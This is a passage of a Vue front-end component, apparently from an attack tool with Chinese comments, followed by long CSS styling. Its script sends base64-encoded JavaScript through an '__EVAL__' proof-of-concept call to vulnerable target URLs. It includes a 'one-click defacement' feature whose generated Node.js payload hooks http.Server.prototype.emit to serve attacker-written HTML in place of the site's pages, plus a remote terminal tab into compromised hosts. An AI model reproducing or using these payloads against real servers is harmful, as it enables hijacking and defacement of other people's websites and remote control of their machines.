  } finally {
    terminalConnecting = false
  }
}

// 处理终端大小变化
const handleTerminalResize = () => {
  if (fitAddon && terminal) {
    fitAddon.fit()
  }
}

// 监听 activeTab 变化，初始化终端
watch(activeTab, async (newTab) => {
  if (
    newTab === 'terminal' &&
    isVulnerable.value &&
    !terminalInitialized &&
    targetPlatform.value !== 'win32'
  ) {
    await nextTick()
    await initTerminal()
  }
})

// 一键挂黑功能
const showInjectDialog = () => {
  if (!form.value.url) {
    showSnackbar('请输入目标URL', 'warning')
    return
  }

  if (!isVulnerable.value) {
    showSnackbar('目标不存在漏洞，无法注入', 'error')
    return
  }

  showHijackInjectDialog.value = true
}

const confirmInjectHijack = async () => {
  isHijacking.value = true

  try {
    const route = hijackRouteMode.value === 'global' ? '*' : hijackTargetRoute.value
    const html = hijackHtmlContent.value

    const hijackCode = generateHijackCode(route, html)
    const base64Code = base64Encode(hijackCode)
    const command = `__EVAL__:${base64Code}`

    const result = await window.api.executePOC(form.value.url, command)

    if (result.success && result.data.is_vulnerable) {
      showHijackInjectDialog.value = false
      showSnackbar('挂黑代码注入成功！', 'success')
    } else {
      showSnackbar('注入失败: ' + (result.error || '未知错误'), 'error')
    }
  } catch (error) {
    showSnackbar('注入错误: ' + error.message, 'error')
  } finally {
    isHijacking.value = false
  }
}

const previewHijack = () => {
  showHijackPreviewDialog.value = true
}

const showRestoreDialog = () => {
  if (!form.value.url) {
    showSnackbar('请输入目标URL', 'warning')
    return
  }

  if (!isVulnerable.value) {
    showSnackbar('目标不存在漏洞，无法恢复', 'error')
    return
  }

  showHijackRestoreDialog.value = true
}

const confirmRestoreHijack = async () => {
  isRestoring.value = true

  try {
    // 生成恢复代码：清除所有劫持，恢复原始 emit 函数
    const restoreCode = `(async()=>{const h=await import('node:http');if(global.__originalEmit){h.Server.prototype.emit=global.__originalEmit;delete global.__originalEmit;}if(global.__hijackRoutes){delete global.__hijackRoutes;}})();`
    const base64Code = base64Encode(restoreCode)
    const command = `__EVAL__:${base64Code}`

    const result = await window.api.executePOC(form.value.url, command)

    if (result.success && result.data.is_vulnerable) {
      showHijackRestoreDialog.value = false
      showSnackbar('网站路由已恢复正常！', 'success')
    } else {
      showSnackbar('恢复失败: ' + (result.error || '未知错误'), 'error')
    }
  } catch (error) {
    showSnackbar('恢复错误: ' + error.message, 'error')
  } finally {
    isRestoring.value = false
  }
}

const generateHijackCode = (route, html) => {
  const escapedHtml = html.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')

  if (route === '*') {
    // 全局劫持 - 可覆盖
    return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(\`${escapedHtml}\`);return true;}}return global.__originalEmit.apply(this,arguments);};})();`
  } else {
    // 指定路由劫持 - 可覆盖
    return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}if(!global.__hijackRoutes){global.__hijackRoutes=new Map();}global.__hijackRoutes.set('${route}',\`${escapedHtml}\`);h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'&&global.__hijackRoutes.has(p.pathname)){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(global.__hijackRoutes.get(p.pathname));return true;}}return global.__originalEmit.apply(this,arguments);};})();`
  }
}

const testHijack = async () => {
  if (!form.value.url) {
    showSnackbar('请输入目标URL', 'warning')
    return
  }

  if (!isVulnerable.value) {
    showSnackbar('目标不存在漏洞，无法测试', 'error')
    return
  }

  if (!hijackHtmlContent.value.trim()) {
    showSnackbar('请先编写页面内容', 'warning')
    return
  }

  // 生成随机路由
  const randomRoute = '/_test_' + Math.random().toString(36).substring(2, 15)
  const html = hijackHtmlContent.value

  showSnackbar('正在注入临时测试路由...', 'info')

  try {
    // 注入临时路由
    const hijackCode = generateHijackCode(randomRoute, html)
    const base64Code = base64Encode(hijackCode)
    const command = `__EVAL__:${base64Code}`

    const result = await window.api.executePOC(form.value.url, command)

    if (result.success && result.data.is_vulnerable) {
      // 注入成功，打开浏览器
      const testUrl = form.value.url + randomRoute

      setTimeout(() => {
        if (window.api?.openExternal) {
          window.api.openExternal(testUrl)
        } else {
          window.open(testUrl, '_blank')
        }
        showSnackbar('临时测试路由已打开: ' + randomRoute, 'success')
      }, 500)
    } else {
      showSnackbar('注入临时路由失败', 'error')
    }
  } catch (error) {
    showSnackbar('测试错误: ' + error.message, 'error')
  }
}

// 初始化挂黑编辑器
const initHijackEditor = async () => {
  if (!hijackEditorContainer.value || hijackEditor) return

  await nextTick()

  const monaco = await import('monaco-editor')
  hijackEditor = monaco.editor.create(hijackEditorContainer.value, {
    value: hijackHtmlContent.value,
    language: 'html',
    theme: 'vs',
    automaticLayout: true,
    minimap: { enabled: false },
    fontSize: 14,
    lineNumbers: 'on',
    scrollBeyondLastLine: false,
    wordWrap: 'on',
    padding: { top: 16, bottom: 16 }
  })

  hijackEditor.onDidChangeModelContent(() => {
    hijackHtmlContent.value = hijackEditor.getValue()
  })
}

// 监听 activeTab 切换到挂黑时初始化编辑器
watch(activeTab, async (newTab) => {
  if (newTab === 'hijack' && pocHijackEnabled.value && isVulnerable.value && !hijackEditor) {
    await nextTick()
    await initHijackEditor()
  }
})

// 加载设置
const loadSettings = async () => {
  try {
    const result = await window.api.storage.loadSettings()
    if (result.success && result.settings) {
      // 检查高级功能是否解锁 且 POC挂黑功能是否启用
      pocHijackEnabled.value = result.settings.advancedUnlocked && result.settings.pocHijackEnabled
    }
  } catch (error) {
    console.error('加载设置失败:', error)
  }
}

// 组件挂载时加载历史记录
onMounted(() => {
  // 检查 API 是否可用
  if (!window.api?.storage?.fetchFavicon) {
    console.warn('⚠️ fetchFavicon API 不可用')
    console.warn('请完全关闭应用并重新启动（不是热重载）')
    console.warn('可用的 storage API:', Object.keys(window.api?.storage || {}))
  }

  loadVulnHistory()
  loadSettings()
})

// 组件卸载时只关闭 SSE 连接，不关闭会话
onBeforeUnmount(() => {
  // 清理 SSE 监听器
  if (window.api?.terminal?.removeSSEListeners) {
    window.api.terminal.removeSSEListeners()
    console.log('组件卸载：已清理 SSE 监听器')
  }

  if (terminalWebSocket) {
    try {
      terminalWebSocket.close()
    } catch (e) {
      console.error('关闭 SSE 连接失败:', e)
    }
    terminalWebSocket = null
  }

  if (terminal) {
    try {
      terminal.dispose()
    } catch (e) {
      console.error('销毁终端失败:', e)
    }
    terminal = null
  }

  if (hijackEditor) {
    try {
      hijackEditor.dispose()
    } catch (e) {
      console.error('销毁挂黑编辑器失败:', e)
    }
    hijackEditor = null
  }

  window.removeEventListener('resize', handleTerminalResize)
})
</script>

<style scoped>
.poc-view {
  height: 100vh;
  display: flex;
  flex-direction: column;
  padding: 16px !important;
  overflow: hidden;
}

.view-header {
  flex: 0 0 auto;
  margin-bottom: 16px;
}

.view-header h2 {
  margin: 0;
  color: rgba(0, 0, 0, 0.87);
  font-size: 24px;
  font-weight: 500;
}

.view-content {
  flex: 1;
  min-height: 0;
  margin: 0 !important;
  overflow: hidden;
}

.view-content :deep(.v-col) {
  padding: 6px;
  height: 100%;
  display: flex;
  flex-direction: column;
}

.panel-column {
  display: flex;
  flex-direction: column;
  height: 100%;
  min-height: 0;
  overflow: hidden;
}

.left-panel {
  gap: 12px;
}

.left-top {
  flex: 0 0 auto;
  flex-shrink: 0;
}

.input-card {
  flex: 0 0 auto;
  width: 100%;
}

.left-bottom {
  flex: 1;
  min-height: 0;
  display: flex;
}

.history-card {
  flex: 1;
  display: flex !important;
  flex-direction: column;
  min-height: 0;
  height: 100%;
  width: 100%;
}

.history-card :deep(.v-card-text) {
  flex: 1 !important;
  min-height: 0 !important;
  overflow: hidden !important;
  display: flex !important;
  flex-direction: column !important;
  padding: 12px !important;
  height: 100% !important;
}

.history-list-item {
  cursor: pointer;
  background: #fff;
  border: 1px solid #eaecef;
  border-radius: 8px;
  margin-bottom: 6px;
  padding: 6px 8px;
}

.history-body {
  display: flex !important;
  flex-direction: column !important;
  flex: 1 !important;
  min-height: 0 !important;
  overflow: hidden !important;
  height: 100% !important;
  width: 100% !important;
}

.history-header {
  font-size: 13px;
  color: rgba(0, 0, 0, 0.6);
  margin-bottom: 8px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex: 0 0 auto;
}

.history-header-left {
  display: flex;
  align-items: center;
  gap: 6px;
}

.history-list {
  background: #fafafa;
  border: 1px solid rgba(0, 0, 0, 0.08);
  border-radius: 6px;
  flex: 1 1 auto;
  min-height: 0;
  overflow-y: auto !important;
  overflow-x: hidden;
  padding: 8px;
  height: 0;
}

.history-list :deep(.v-list) {
  background: transparent !important;
  padding: 0 !important;
}

.history-url {
  font-size: 13px;
  color: rgba(0, 0, 0, 0.85);
  word-break: break-all;
}

.favicon-avatar {
  border: 1px solid #e0e0e0;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}

.favicon-img {
  width: 20px;
  height: 20px;
}

.history-empty {
  padding: 24px 12px;
  font-size: 13px;
  color: rgba(0, 0, 0, 0.55);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 6px;
  text-align: center;
  height: 100%;
}

.history-loading {
  padding: 24px 12px;
  font-size: 13px;
  color: rgba(0, 0, 0, 0.55);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 12px;
  text-align: center;
  flex: 1;
  min-height: 0;
}

.right-panel {
  display: flex;
  flex-direction: column;
  min-height: 0;
  overflow: hidden;
  gap: 12px;
  height: 100%;
}

.right-top {
  flex: 0 0 auto;
}

.status-row {
  margin-bottom: 0;
  flex-shrink: 0;
}

.status-row :deep(.v-col) {
  align-self: flex-start;
}

.status-card-text {
  padding: 10px 12px;
}

.status-content {
  display: flex;
  align-items: center;
  gap: 12px;
}

.status-text {
  flex: 1;
}

.status-label {
  font-size: 12px;
  color: rgba(0, 0, 0, 0.6);
  margin-bottom: 4px;
}

.status-value {
  font-size: 16px;
  font-weight: 500;
  color: rgba(0, 0, 0, 0.87);
}

.right-bottom {
  flex: 1;
  min-height: 0;
  display: flex;
}

.result-tabs {
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

:deep(.result-tabs.v-card) {
  flex: 1 !important;
  display: flex;
  flex-direction: column;
  min-height: 0;
}

:deep(.result-tabs .v-card-text) {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}

.tabs-bar {
  flex-shrink: 0;
}

.tab-window {
  flex: 1;
  display: flex;
  min-height: 0;
  width: 100%;
  overflow: hidden;
}

.tab-window :deep(.v-window__container) {
  height: 100%;
  width: 100%;
  min-height: 0;
  overflow: hidden;
}

.tab-window :deep(.v-window-item) {
  height: 100%;
  display: flex;
  width: 100%;
  min-height: 0;
}

.tab-pane {
  flex: 1;
  display: flex;
  min-height: 0;
  overflow: hidden;
}

.tab-pane-text {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  padding: 0;
  overflow: hidden;
}

.output-card,
.response-card {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  background: #fff;
  border: 1px solid transparent;
  overflow: hidden;
}

.response-container {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  height: 100%;
  position: relative;
}

.response-view-toggle {
  position: absolute;
  top: 12px;
  right: 12px;
  z-index: 10;
  background: rgba(255, 255, 255, 0.95);
  border-radius: 6px;
  padding: 4px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
  backdrop-filter: blur(8px);
}

.output-text,
.response-text {
  margin: 0;
  font-family: 'Roboto Mono', 'Consolas', monospace;
  font-size: 14px;
  white-space: pre-wrap;
  word-break: break-all;
  color: rgba(0, 0, 0, 0.87);
  width: 100%;
  display: block;
  min-height: 0;
}

.pane-card-text {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  padding: 0;
  box-sizing: border-box;
  overflow: hidden;
}

.pane-surface {
  width: 100%;
  flex: 1;
  min-height: 0;
  display: flex;
  flex-direction: column;
  background: #f7f8fa;
  border-top: 1px solid rgba(0, 0, 0, 0.06);
  padding: 0;
  overflow: hidden;
}

.pre-scroll {
  flex: 1 1 0;
  height: 0;
  min-height: 0;
  overflow-y: auto;
  overflow-x: auto;
  width: 100%;
  padding: 8px;
  box-sizing: border-box;
}

.source-view-container {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  height: 100%;
  padding: 12px;
  box-sizing: border-box;
}

/* 自定义滚动条样式 */
.pre-scroll::-webkit-scrollbar {
  width: 8px;
  height: 8px;
}

.pre-scroll::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 4px;
}

.pre-scroll::-webkit-scrollbar-thumb {
  background: #c1c1c1;
  border-radius: 4px;
}

.pre-scroll::-webkit-scrollbar-thumb:hover {
  background: #a8a8a8;
}

.preview-scroll {
  flex: 1 1 0;
  height: 0;
  min-height: 0;
  overflow: hidden;
  width: 100%;
  box-sizing: border-box;
}

.response-iframe {
  width: 100%;
  height: 100%;
  border: none;
  background: #fff;
}

.empty-state {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  flex: 1;
  height: 100%;
  min-height: 0;
  color: rgba(0, 0, 0, 0.6);
}

.terminal-content {
  height: 100%;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  padding: 12px;
  box-sizing: border-box;
}

.xterm-container {
  flex: 1;
  min-height: 0;
  width: 100%;
  background-color: #1e1e1e;
  border-radius: 4px;
  overflow: hidden;
}

.xterm-container :deep(.xterm) {
  height: 100%;
  padding: 8px;
}

.xterm-container :deep(.xterm-viewport) {
  overflow-y: auto !important;
}

.xterm-container :deep(.xterm-screen) {
  height: 100%;
}

.output-text.text-success {
  color: #4caf50;
}

.output-text.text-error {
  color: #f44336;
}

.outlined {
  border: 1px solid rgba(0, 0, 0, 0.12);
}

.tab-body {
  flex: 1;
  display: flex;
  min-height: 0;
}

.tab-empty {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: rgba(0, 0, 0, 0.6);
  background: #f7f8fa;
  border-top: 1px solid rgba(0, 0, 0, 0.06);
}

/* 一键挂黑样式 */
.hijack-tab-content {
  padding: 0 !important;
  height: 100%;
  display: flex;
  flex-direction: column;
}

.hijack-editor-container {
  flex: 1;
  display: flex;
  flex-direction: column;
  position: relative;
  background: #f5f5f5;
  min-height: 500px;
}

.hijack-toolbar {
  position: absolute;
  top: 12px;
  right: 12px;
  z-index: 10;
  display: flex;
  gap: 8px;
  background: rgba(255, 255, 255, 0.95);
  padding: 6px;
  border-radius: 8px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  backdrop-filter: blur(8px);
}

.hijack-monaco-editor {
  flex: 1;
  width: 100%;
  height: 100%;
  min-height: 500px;
}

.hijack-preview-iframe {
  width: 100%;
  height: 600px;
  border: none;
  background: #fff;
}
</style>
